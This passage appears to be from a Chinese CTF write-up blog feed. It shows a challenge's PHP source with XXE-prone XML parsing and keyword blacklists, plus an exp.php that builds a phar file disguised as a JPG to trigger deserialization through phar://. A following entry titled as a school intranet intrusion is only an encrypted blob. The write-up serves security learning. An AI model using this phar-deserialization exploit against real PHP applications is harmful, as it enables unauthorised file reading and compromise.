<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./config.php"</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">"PRC"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $data= $_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/flag|decode|file|zlib|input|data|http|ftp|#/i"</span>,$data))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"no!!!you cant read flag right here!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $xml = simplexml_load_string($data,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>($xml);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现包含了config文件</p>
<p>接着读</p>
<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $filetype;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"wake up "</span>;</span><br><span class="line">        var_dump(readfile(<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($filetype,$filename)</span></span>&#123;</span><br><span class="line">    	$filename = $filename;</span><br><span class="line">    	$filetype = $filetype;</span><br><span class="line"></span><br><span class="line">    	<span class="keyword">if</span> (($filetype!=<span class="string">"image/jpg"</span>)&amp;&amp;(substr($filename, strrpos($filename, <span class="string">'.'</span>)+<span class="number">1</span>))!= <span class="string">'jpg'</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"只允许上传jpg格式文件"</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($filetemp)</span></span>&#123;</span><br><span class="line">    $target_file=getcwd().<span class="string">"/uploads/"</span>.md5($filetemp+$_SERVER[<span class="string">'HTTP_REFERER'</span>]).<span class="string">".jpg"</span>;</span><br><span class="line">    $handle = fopen($filetemp, <span class="string">"r"</span>);</span><br><span class="line">    $content = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof($handle))&#123;</span><br><span class="line">        $content .= fread($handle, <span class="number">8080</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/xml|#|SYSTEM|DOCTYPE|fliter|uploads|www/i"</span>,$content))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Invalid file!!!!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">    fclose($handle);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($filetemp, $target_file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"your file is here:"</span>.$target_file;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但index.php并没有把File类实例化。File类中有上传功能的函数，就猜了下upload.php 。还真有。。。</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191112234259635.png" alt="image-20191112234259635"></p>
<p>读取upload.php的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line">$filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">$filetype = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">$filetemp = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$file-&gt;check($filetype,$filename);</span><br><span class="line">$file-&gt;upload($filetemp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>并没有 <code>unserialize()</code>函数，但根据源码，要触发 <code>__wakeup()</code>函数才能得到flag</p>
<p>这里可以利用<code>phar://</code>协议，触发反序列</p>
<p>exp.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment">//生成对应可被利用的对象</span></span><br><span class="line">    $o = <span class="keyword">new</span> File();</span><br><span class="line">    @unlink(<span class="string">"phar.jpg"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.jpg"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"JFIF"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加jpg文件头用以欺骗检测</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件  text.txt内容随意</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将文件上传</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191114132547110.png" alt="image-20191114132547110"></p>
<p>利用<code>phar://</code>协议触发序列化</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191114132652219.png" alt="image-20191114132652219"></p>
<p>解码得到flag</p>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">参考文章1</a></p>
<p><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="noopener">参考文章2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次学校的内网漫游</title>
    <url>/2020/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E6%A0%A1%E7%9A%84%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="30258c8ea7246a483031cc50d9b472626dbace65f899477a34f97ae94df7d9d3">541ed2b57286a70f48aa3dc8388e3d2e3310d0bdeecfcd97d2b251025de583d6e546b0e407031e7c4e9736bbfdad5a5335300566be53d20cc88b9a6b8a88ddde63b5afd375dbe42127dded9abe80dfd9c27b07af48926a3702b85617387c13bb222f143254388a43ff2459683304675af88a61dd80ade6110435477a0818dea845dbc3536c7166ef4dd8ffea5ebb898aedaa3ab723f40dd69699092543db54afecd3d872d37618dbc243ccdd82fd62c64281ab7390b41fccb48317d44acf80f6527c77acb71e579d23b33a1322514d57ce0ffe1e77b3c1039953603f05ea6c475ffe82b9b387f473b8ee57fdba46dbbf430d1416e8a432574444e089c52916ac81d657748ef1450761568fd4fcc6e42bd586fc83bcde0ad4080fa723667b8fe27c281d354477414ac56cc1155062806e97e0618d8b454a7e733d9dc8c7cc454d2b11cc5e381b9795f1dd2ee4259912dda4ec22d07c0fa90906ef935f0bf821007d1414b1fd6a8cf5eebc5f2e8fd1928617b201fe37e6d9815e50bd5966b7cf38e60578d1529c1b1dcee943f5043fbf3371e99c04652e4a50e7d0356be3bb1e6dbd4c5abb150c3e47c37312edb6017b6c95f188a2bcbc725636e943b11358fc375f1f95209236d099459de553ce575d793d4e3a5bf1f14ced0fe504bd02f97296b1d413acb1560cf84473848bfea2239fcbcb69ffb3a920df28e6049d64fc3d805ba55047324e79a73c174c52e836f0839b9d19b4fd62e23e720b0ceb378e52580ce35e791792a436a989586d7dd7056bd6b9bc49bd5af544e3619e333ec1505be7ce7d1b6c376aa22393520479348e466cf175e8c474f585cdabc5cf4b105fb46d1bab88b4fd4b4053dc5afc4974d09338d07a0dbbce62d461e702bf5df16b2b0c6ce466329b65f197f62887d9109a98a00438d6acd9cb20476701592751ade9c6728577a9623d0062554c605f77a80e1e3aef60f1c39d50161d00596c43b813f4b72de4aeda784db0a7eb371b47b35d558c9513603a6c868e5c61eb6001a36d00b44a5b5606bc88f7d91a6e0c5822501e299f9ef3bbd71cabb9ca5c61e788df6008bcac7b12fa9b1b8696f1a323286a6c0bd983e35aae44fcae180f15bd4914b880903b1a8dcd7ba18c404170f1bd8f348f5cdd93c46330f7958955ebaed119633fc2f77be1be5afe8cc9a01a5cd1790931ba3d801cfe0bfdd2ac070318b0eb406daee8101e61bff8698e24dc7de9687b8f59de3c831b53e0e72ba0d45cbc435a86dcc7df9b4f127091287510893f3318612519b2843540bd8459d3a33960870177992f1e254dc1ce8f1af8b6fd8548d320e8d5bd7f628ee9d1be5025e185f9fa8c30b85bf37e7a55f227a074ab1bc62c3201e1d42136faec344bb4e57e6e163cadcd01df6641dc93b85f10404a413463b90744ba32ab08fc1c38b4d1429f13161f9c84c72740fdf23e0d11b08c350621c07685bccf6e8ed8031c64ff99c820ab5cf2ce3118677b3b911ffc95d11e8b7a18ca2000c567b63ba8b70baeba8ceb0cf2281267b9ac9d46f0ae2ecae79c7dfdb47809c20b497e692e8873d7ab5c03fc8e04a8bb90356edabb9f6ab815a38cc46cc0b781bd6653d6f831e64142c42b0f6faf8e16c96827433c5cf5f2ea0ab31c4e969229ba609280d06991b5805e42c0f5404f43fcc4d2cb52476c132ca94e6969e4d4e0117909528e85bc2d23b533aeff65d60b9c8a4fb24d15ef60cd4cc1193a3c45321440e50001051aaac2471ed799edcc2c42c11ed6abe8b56c1bad6f136de080a2342905d5f9e71a83567a7633a9dde3d2083cf776d244e7815d94ab64fa89c409f0100f595c9fd90fa631cdcfd2dff90ff8b8b840632b16350f326f9d90377af39895fe9f8eb6d3c0204f6ae0afea3d7f9ad9cfef48a0be9fa093dd2b629adf589cef53c433c2825d81f431fe62e24c1139b854e0e4890e88f6073d2ddedcef5d0a8577755bcf0716310413bb0209331b74398cb0a807110df310b2927f5b50bf3212b91e5bfb828d3889d1849a8f3679538423bc2f6c7d8a74ec1b628705bdc86803439cc37785f61eeb77dfbd2cb838e5d59bec88894a1fdbea45625b72a79bcf6c2e8b03f36726bdd8bb35222af80321703b39f269adfe4a0210535d565a9f1507e48551322809c705d672c1f889c17a610491c5a35274423820c83e76f8704c8eb78280d9bb03c9e98e87d5c3c95e2e2df485a5558365942a3a6b1c003e2aa3223d6fbf0cd7cb4e3840ac733e531450278aa2557a8ea1b5423a989437364710aae85be4958bd0adb6c438008a8f9832792e1be6c10def65c0d42400bb2a5b91828b2ec17dcae29e02f074716fe18bbc5112b2b3c76fa9c849a7f6e2f1e9e04a90285f488e51009711052d1496a03d4c346e3d3cbdbd562b2f4870741059c1a36ef6e9f8f9e6ea7e35fb33961cf2e6047c0f5d03975a114d14a1ba7a99faf389619fd8720781c27abd6bafca27fcfd57cdb7192190cd220fca9f09dee3b183122bfcbe0617cd46cad48c34c7e69f2bac73db2a1adbfda3b6664f46d6c08b13cada66c45a2c591e766d398dce82230490ff258cf635e375a2511048d769f11176f50c5c945f673af823e5118271d2402284eae3ebfa1040321949167bbb4dc2e66a8c7463086c40fd3747f26fd2e0f5062f69a59b7130e91d11d81e84254d3a8c7d403cbf05415bb7d0c4c4c839d39732091bdeb3470bdd25ae1c1fc51426abe1717aa50973bb97de1fa68d4f3addbb7e1d0ac70674abd95deae7283cb73b4eda6175e61f46c6a1c0b96fd37addb6fec4b2f30cfa95a9195a716674088353655725d476cf49d2aa19df4f5ca5dffbb2a35458dd156ebbf08c379fb3d99f51a1f8225abd1ad562433c26e4ba403a30594bb2e11cf757d04451c6158f726578f71d031704c9501dd09ef3d80b5bcae68aa036e56760fee7d7b047d51b071c1922003598a4cf17369189ad03a34de6e06256e7ddcac8b92c3e1de3352b8a2e1a765199131874a208c355d15095e7e4a9dc14d8602e6d131e366541f0d4f4a6d14f356578414fea669bb8a6af2d21b65614982dd10d79ff19c3dab2a0b292780a60e874030ff468bea478b69a8450f848b7820bdc82831b04cb9a395021424b95ece15e7bbc20076bfd6e348b9e0aa17704a998c9d20f7ff4a44a34bd01aace3382f85a80ebcca5ef775cbced245128afbd7ec20751417a949b1da7f61f00e4a246e2f54db984930769d46d79871d10984a835645845b8c0f391fe4e1d64e7eac84cc949b3d42bd1e6d7b2630bc5af270bf34ffae67183d7154dedf4e092ff37f32464b0820571ba248adbb63f82fb47126284360511347e3915abdeca4bed82ec039676df1446a6863f7e05c6ba042227ee01c99d8a3839b158c55d91c68510b15b274cec2fbe8fd1015128cb1b4ca07b249dfb832362345dfcd54c10bebc83f932f9d9d22c43e26a4dde9e289898e495ea4c13688955aa8f3bc67b595d6d66092e9a29c849d532fbb99a48cf9a50df5868c9b54b7d3ea9682a652e595b3c115626726edd602d301df2e637839898758acd0398ac8e2b9b949d0eadc37e9518263908077ea1903b467405aff1cf0ec0c8cc3503386c378850c9800f58814c1d1ef594e4e73448b43db463c2ed13826cc7af700e92eb526aee979c5962ebc4e3c67ca9d7d70759e02744d10cf1ed7e71f1b33efc249dda02105d71c7b155c3a77316569bb0c46872ee7510899d1f13e70cefd1bc997025c7c41d9be6ffc32852745d0c9cfbbd1ecfbc1a2f60da47960838025914eff55f95f63f2fcbca703d993ec404a092d3e4fd9427c4d7c1db146b4ae990b2b146d654ef450e0b340acff77374d9fa8947e95b5fd5820ee4d1e6ab9468f400ddb7e98292f884b17bb45f7a36c99320be4d9d79aa92bc976fe54f69f33fed9996e0a4c87594b776fe33f8b124ed6b8eb4a4b20d1a469ade4dc52b7349577aa4553b06365eaf641c538d882c39b162c04af68061a76477557b02e1e84bc4f3e194ab23f0c6fd506c7b8f59654e7d5d8b9a3cf186998c578354943852d74ab283401c77e6317aa76b081cdd439cb1c8db9d8c9a3bde0aebc24a0deab66595d22d99c4901e4972f22c458b34350250dc30f8010f0e8d57ac38b37e598128814272085aa2fbc22604b632f31c04cf2e6c0f451faf4d3f6c8a41ce0b42eada1ed91986eaca6fd4428c38b280d8b3d0de01f53bf7b1da7f22f6bdf94eca441b64f4028e472f747f1d4648ca87f17ed2c3251b11b4c2d8da4b11f0ee610fc5c5262bee868ab4a25ed666a3e6320aa37b6048ec06fb82906ccd2c5fde8e1f73483eef0f64cdddd9d712ed2431291af433c3ba711313570735142bfdba6596623f0bc573ed4968b8804cbeca31d07f162d34c200b0560debb39ccc6297f37199fce0f18c2cddd5d2c0e54df0ec739e1165396c2b065d6946caf42f7a8aa59be4473fe0d5e22e0aa902a9a1e6b1ce526e051356dbdaf2f5f154521aad52b1c34fdfb9646d6f56a21cbe3a0c35831efa4a877e034360b78b3dd1c24a7618f0a857bba69b2474d61b54281cf28d711ede517ad3280a0f27e9e1c82f3c4329d1181913d2eb060fd63504a70b460030f87d4e16023a37a2fbfe7f5e8f8b9fd0c745d8356130eacc4fabdeb732c71e517d2fdc6c490de01e6af639a69242480ec61649f2eb41c29010807b9124bd03a3befb1727cd8f553888c48ae657c1be6b2ed2373976cffe59d27828d54bedd375cf147b9badae42dd47cf9d7f87048bb8436e070ace16565fcaf8ef28fafd8560d235176c918362e19ac344fc910282ad46f625ec62b6c36676804572432971feb97dbe916dd7a97400f917babd9d12d976c5a1ba9b25099f827be5fdafd08b4bd91dc55190a893a6c643e4fdae7cda6e239d3419b1bb6d7c5cbcbd1ae7bde0a84fe979732941e8bb9e1987539b3a109db254e6a99f1a9fd4fe21e0e2d75b7d3831e7d069e2055e6c2b89eeda5028093805deb7ae8a8e5a5244b17d25c4c3876a6d868f7135d8f432b46dff23f46c5d314dac2a84e26a5a6891bd306ad81f8212e0f6ae37dfe109d992a507bb5277748ba4d8dfdb810453f124932ac9d64dad91e403324f80c5b8b2f6f84506466b82f2186a822fa0cfd34d95bfb17874209adca2312a21c203573bfc5df79e4dc9edfef08c72705541b7aa7fbafadec92abd06f722dd6aab0d1f2ffc787775b9efe29265325f3398641b57e2d6e925a2389fab416c08991f97d7016671b7f5760d6c8cb095b88db6457af891ce158691c93606b5406a466ad80f5d88f2469465ec15290efb3e1ad7f8030569c59f2af6283ab8f8de9f28d9afa2407e80ab235a481c6d3ce3988daba38dd5338ccb3ec7b6994e118c637e9a8f8defdc81a4f196c369d37376df5388e2cf0a8d5ff0a450db78fcf2c573f8cf8b46bf00027e2c4e018eac86bb1d0b6bc54a30562e9a4986bb12b90fd6ad06b3560499beca7bac0f9bbe4a62d7b1b54e8e9f434a2829fcae4d51adb288c9dfaf3681aa725eb5342d30753dba42fc99b4059db70e406f78d33f88c4b2699b8a059a6958163c3a8d9e0a044497e4759b6424984a41c2c46d6a9497944d3b233030a76e00ff08cbc387d896dd65a3b5ef2f16933e0db5de523e443435ff3b2dd58c72ed312674568137ef5eb281793cd06d0efa14b13396e0fb262660cfcebaa060810a03f1a0c7b492547230b180ab0bab2e8d131ad4005451eb525f8eb2a93fa5de57737b8ed17d409310aa1ac2fbfbc9e456c50ac56c5edc8dec2f7571d03b70bc8b2f1dc145b301bc8cc78170b24afac21aa4ccc215c79223d793994cf6e7f17a4e404f7431d7d7a395f07fd4d4a8221eb26672829d4ea5ee5bb8d1009484ff753437a74480892d58ee918ffa93ab2bb2516ff15b3e83e0064f22c5330b66a72bd49c508dabcfa08949585b675d23311daf79ec5d65cfbf0423b789e9fa5f48dfb1584562716f3cf238f7e2801d43518781d09d43d58659f7b1f0517eabb6cd828971e2ee29b2d60436314a39969e54da81247034fd8b5970223412a4286ce69f5c8729e3e9289b7fd048d12372ca14f77d87c28236e309cb8c68f9bb3e20961ca380986960e63c2f4bb48a62074cad58eb2718fcc80cf29732672cca5915840637ca49327bee30628e724b51f419d0cbac95a33f496c0a924d7afb99e2632247b64a84eeeff9e4481a8d428100d854f27fc4e099f3de4ad44a853b5e60b7974ff597357c486f918ba31ff2041f06c9172a1f1f4588f913e8562e02d859c07455154415e0fac0368ec0d11232b247f2f41c4dbc54b206e76e2aa5449149da810d968a3dd9fde9bc661761673aa7d41a5889531523f6ec46b789392878b112d9c407785e2b4586953ed9564a168890cf71a18f5ac161c776c552a9103c8fa50aadfd8b4723ca9e91ef27391364c829e0b60bba3f2afadbace842670cacd4464cc463b36ac8261eaec1a46985226fcb10b75ef76097b319d58f1b5a19fddc0fe437cd21d1505a23322282344c211d8eeedb544b6fc99a383205b6edcaf163dbef6363e6314b5100b36e179fad74cc62b7980d7ffd5748bd178e4e6cbd8ed2764a398f2551de3703a3b219560cf439f252932e19ea5becb5dc0e92c5e5c54cb6c1c9920a8945a2d6697eedb8c4634c657ab98704875040e818effc990f5c66414e588589a1f80797dcac1d3befacd5c2de32ca0b0d239419f8d979cbef5e3c7a258324d457ffdad93e3f1003d50720e4344dc3a086493a6ba58872f132e7b3f2ccfc0a358be2b9e413e5d819679c6a1618771df6bb394e5700b898eb466b46a8ca197caede76c7baf698cab15de21ac87ab998833e1dd650065c7be475a8c0dbb003c11aac8ede703c5b07f15f669f16a16bd4282aa26d050e0fa236e8694b7d227c175e10f052a62d72751b3f1fd10596a48f99524e16ff70a2f8125a34cb71d4c90ef5ee00b5e0777aaf7b3e1f1bed716d8ad099040856d76c36baf421053cc62b4d1a875c2e02aecfd10dd6eec927da9671f1a6e44c0fa7481b99b5382bf17e4b3cb074beae18d4b4b3b49041e37ef0daf0e987f49e34ab93ad4e457ed18f791b4f7b3e4edd0ff80f240bcf24c4f46785cf9b757414ecf9282e1f19aab6f4ebe98bb86f916ce0c5ce3fc3f57f0023110b59e92c7b5416207d0b0fb36848afcd78d51d186834dd58c38a12b99470df3ddfcaf68204f4a5d8ffe2de3213e1e5c50cb821de6480669ceca25dd53e0825f0ad4e2432b1a5672347ece90fd6651eb09c02513123302cd0d51075d2e40e126939734c5f451ff0d0343c326c086844f5c68eecef4558339b6650518e760c7de0ae67c51a6c6d21bc84ab4c625547a3fdb9a5aeebcf419980d6b29f4beb1c98e432178e04921f4fd0e8ef08505c93a3eaed7934e476bfe51f3ef7a28fa2aad68e7df62091c37149d2e83f21a2913a42613e3d45ff542f24f19c2d8d6c1714f80e3f50177f1af8deb41110808e8f2c5c7e1800300d450ce04a9ef3aed6de75e4536fda865e50efe3fde486bdda49791c1ed5048d2be0a844fe136f4250a42bd571ccafb8a797d2e089894ec0fa451c6fce809efbb72341fbd3c869295da486ca0a5bc6a09f2f6e153b1f6ebad3de9224bd468b1e69e7e295eeee42d82e160ba705936c9f8a45ce682c595ab4e022819f5fd12884e08bcaa2ae089195152d22ced5e7094117af801c5d527fafc7ab0b2662551f993b86773cc3d9725fa4271c8f6c93d7552bed54982251784dd5c4becfe143872f6c30d5030a54c19b7523e7f7a83d9913c7924d114c8646ac40bb1f1f58b6ce5659c383a9087bad6de703074e579d208dc5429ebb9f3479ff041de135351bb2390a39339f3f859a879c53b69c71a0f37dd82d83d0cfd91ce0fed143c9805c3e2b5035d63ab4f28c030d37f25d6cb830febc20440ecbab076f680ffaf42eca5a22f044ee9762e932a216bb34bbd07eaffbee5c22580ff6fb32e8c37b9b3e58fbfbae79301c313d22c73a80783cf7e79513cbce218bbd10fc39b183596f8ddb8dd0948455dda16ed73b518edc373f434a730570c3f51a3003285e35dcea35c6fd24782fa47b95a515e94e448d598dc2a7d05fc195408b6622e7aaee680485e5f9fe61a6f2c58601865876068990c343c34d6a2d44924be9c855aa393065e435b68e0f189f94fe1438beb29789ce6a6f99f97a3a8960224aa41090da9352a6cda2793e529190dcdf821bb1fdc906dafadd7610fa4d8613d501259959546e9deea7f03c4c21e0f645952c78f7b89f5fc95ce75b53d31016ef1b5ae006c55aff063c20980ac3560194f33911be68e8690b5d38311872206f14cc5af3da724bb9936958da2c376a5a88eef16a2747d05b300e77cf3d743c98234c20674a350518c52cd51d1bc5b5b0f6d7524c5868ddc0155999c1477861156cbbfa5c555d2c74bdbd62078abe60d8db48a3a2b1bd75a0c9417a6ed969be3907e4474a2a674ce3a191b001133c6cf0e2b9a7804f0881481d7ce52bc2dec561dc283765d92f5c7c613032e8db3b72becdb54bb4103de3f624838367472e1b10a1772cff95807af9461032c9d45cb8366346a731698bfde0fc2f4553a8bbedb78280901b263ed01fd5800223778ce160aa68053b73b3e48aa727a912d7528d0d2b72b3c62755480da2fbb56869c5706351fc8ddeef3e209372c43abc1b70399a8a0b14c6deac36433a9946bf983eda5a1efcc133737400b71dbda2b15cb7da121980e5862d8e5c1156855083fb3d105e9d5488f6ba88666a8cdcf23952821770aec6d4e5fa6723bdcda7aeb068139551376f4e03ff541978b2ee7bbc5a66ece12a52a41b58810b22d00e8327da5919049d6c6f45816157de3050b3b3acedca4046f591b4e028729fa1913049493d5a461497a0f747d2f9344eef935a321a9a486c435609cc8e1a4f0ef1ffbc145c7cb912ddabc443c7cbbc412b088904bfbe363bc4c47c95e1c235dac7eeea61c51bc09a5d95feaf0e7cbb05c1bcf63368ac1f76e551605a83755cad5e143505a1393061e905ec40576d1520b16f0761c076182fdfdeac39255d130ede0f0d7bdc22cea24c1662423af00f961519a8923ce167366cfadad71f8b223b995605c8da542d3e8e5befa691e7d189b1fdb171d867ef86e31badbfba1ed25406d814ef63e788a423e5e56ac8ee080ad3aefdba306a868c5da241d5dd192088669ebacdf5163e0bceb85ed2fbbf32b08f61bc20ea881eefce8759ae6bbe31d2240b6913781719eff374fd7e61cadae8705b0e7219d28f9f2eac32d0eb8a109672109b7e79f0a8047a583fa3be3f1d93014479e2261ece351a072cf0eabec8f1e07d1439a22af8f400981b47beb2bd7c88ab73296585872738d8b066eede0ed03f953b5557964a1e0571bedfff95fdc0ce6207264bce873323a8423929a329750da45e613a000a64c7651a1dfa4f7613767c8aeff6a7dbf9f713d1db9d4b0da7bd35351f0667dba5cd92e5f6c591086b47f259f0a0d46c83101342e13594feb4f764b4dd8f78a56cf6a41ec1b00bfe333936b203d9cd2b8cc5e9d48600a843daa198611289d7f6e168e0469495dfe1763484552e5a4e13acc51b0a32ea23c3b832443ee1e44a11948c0eda3325ac93f9e79f6ba711fff82c8fdfc081f6c2d4c36528473f322423b011f1c6f87f851050f33f3a751d1195503b491b90cfd226e43f7d15e1795db609985884c4198d25881d400abf17a7e620236d72e531114cc538c9c45c498304f2e88dd0a53e644d8509223f4305c8b041a7c9b6b638a509fab27b659c1e780f56e9402b5f752d40300f35e6e3988c1bf2ac03dd7d138f15a654d45a70e36850b303dd5b34a6e490d9163bbd83e4bfbcff3d61dd0b5117d68ae0ab8fb5db2161f46a4acdaeb8f2532cde186ca1a63ebb41052e9ea8119b14e35d475f580b5a4429814e713e6d8369553c8f77fcf254956745ab7797adf53810e0a8051600b6adfcf7cc2dab692365fa8f62e957fdbedec982b8a9f76782aec67d275880c34c72d7ef49586447276fd973e2a5671b60767d333e85c2f146c7acc4d6ad285a1527b1db169becb888801e23ad5ad012e4abb43c179e1388e767f9c593f330a40f8a2bb37fe51b73bb909809e736c1ddbcb81ddc8fecc7d290cdc1c2e97b3618954a328f3d0c70e72d85c3e42853bdbdc0a1f0df76f795a5b7823f3c68a0bc78200402af4a5d42bd8a5451e14becd3af12a0505ff5f832d2ee2583eba05ef28bb538bf2bb81c37304e6d7405240178ab05bc04480611001493fa892a5b4d3d5d1cf17480cf61c5a387bcc7caa19d2e936aee58897d423b874c8b14ba261a9a88f94db88a172d21176c3eb6bac90bfe521a4578ee5b1dd57e8d6d1b5f226ba93394130ca741be5419d7491c151d3e4642acc1b859722f478a49e520751db92543697b0daf8c39d0885d0f5fb84a5ba0d1c84caa6ecccee4ef343f5983b448c5482d4689b16d0736591872878580ba689230fd18a682ca04ca5a6fb1c043bd0091c3f3a34a9b581827275eb6d964583dc26ec826d0056cb796acd6ec0664232d9acdcfcf312b488b98f0cbe5636a4777adb1ff82d944acc0c1959550f57da63d692ed3aeff1d052cb039aca95395c18769cbc7ba10f302ab397509369cebb7839d421812211d9146f52225cc35e11c3f03231c263ec4ee74bdc29fb8487d27d005251e82687a37ae3ce51d61ba2df8363fcc35c88d76f95a00af9e68bef3953b67447fb94bf5c60ea7d7143d86514b4bcb3c39cfd10b022640ca73e1e30c1ab0fb4e90712cb3332c1adc8844659239f59ca976bfc1bd23f11fcf05b0066c3b775c00a26435fed419a351ef7117b35cf96842ab984c9df661d72f28ed33c4b73eeb4d7fa779aa4f454e7c1258ded20c69035aa38a41fc927dfada502f90a972fc01e20f928de38a6a1dfac9b04ba6d737f411bf6e76150091905629731da60e83c914dc3b292a65ebae01dbd661508db7b3e9938a03b9d5446dbb6ccf3c4ce01043b7158c7dc6dcee747cdda814326d4c4b77c87c78546301920c8ae73d3d23091065e7b8c76126da9dea80434f656ae95f7afdc97309b148702b020ada8a86faaf332344b90b7f24d5ad694b4ab785a980281284659bf20c8e696e1213a40bef422395e8a720fe7bcf031d9f072055086f40bbcd0c55c301da47c506d67a97894ce3f7fe689969d725a9cde1f834577ad1e9dfa300ee59f07ac47594ddeaacd9c30805e804efbdfff06daa3c5247e3d85c9c2079dbaa67c803d14f066fd27d05ff5afd314e4e62f1a1a4b794c3da4edda20f05cfe5e8e8b8234515b40420168aaee6d8a7fdd3e3413e1690193fc7f23caa6cf7f70338ddaf5b0f5416c19adace410c2d633c0085e76a6be410c4ae3bc0c36808b95e6c4d235b0292fbcaf7f16c493b9e7af40ce71430f292bb39b4716102821616152476eb94bc943db93e6bdefcbe1fe9762c1c173b3227db51a4d857906a25c83f10d95556f119f6dc3b113045c25602efd08e9e45c3e4c761433ff035108794782e29bdda0cf3cb597176325eb3ed26c1321239eb1d6bc14e781034f3eed334d776b197f099a842144aac43cb83aff49c4aa7eb9d6af1063eb3a987dbd63056334c25e150a200723a77efc44d4a6ea127e1f933bb8c985909ccd1985e2a360a2e0d00251e89c7b4953a08e4c936cef2362d892f153d972b00614f3ffb5542e3c8e008ab43feaa3ac7fd13b520546ece8b28429d5d47a92fd40c30b3b0f6dd436cb87d4633d851c5eb0603aab3d44c9d8c7f5492b63f58d021ad1f2a3bbb59ac4eb28aaa5ae7caca7485ef697c8f8488cef05f7845cfe88add8aa95a49d6405673da9e7c1130c882a51f0b04bfef1b555897ededcc0cc431b0cf8f8c4a0638852cf76479270d9a4c2214f3e9456e7734913321494e07c99fedf4cb44c811d9cb95d77a982c47bffa9572a2c139cdac178dcc7b01a3931ce0a09ae45f5daafa2b195d9c7271dcdc070b9cd0f54a257f8477d27ea466181bfb734f2172e943bb5a1f8de3fd1bbea88cd91815ef8c7b76306abc9f0963f1a6e916e7bd5c0eab8f7083ff93571462a0ebdfcbccb6685e70bdd73eba222c0df1b0cebe4fc088b32daa00bfa39362370536411d05f7ad